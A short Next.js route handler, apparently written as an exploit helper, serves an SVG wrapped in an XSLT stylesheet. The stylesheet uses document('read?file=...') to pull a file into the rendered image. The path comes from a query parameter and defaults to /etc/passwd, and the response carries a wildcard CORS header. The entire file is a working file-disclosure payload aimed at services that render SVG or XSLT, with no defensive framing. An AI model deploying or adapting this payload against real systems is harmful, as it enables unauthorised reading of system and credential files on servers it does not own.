import { NextRequest } from "next/server";

const svg = `
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <svg width="1000%" height="1000%" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <foreignObject class="node" font-size="18" width="100%" height="100%">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <xmp><xsl:copy-of select="document('read?file={{file}}')"/></xmp>
      </body>
      </foreignObject>
    </svg>
  </xsl:template>
</xsl:stylesheet>
`.trim();

export async function GET(request: NextRequest, p) {
  return new Response(
    svg.replaceAll(
      "{{file}}",
      encodeURIComponent(
        request.nextUrl.searchParams.get("file") ?? "/etc/passwd"
      )
    ),
    {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Content-Type": "image/svg+xml",
      },
    }
  );
}
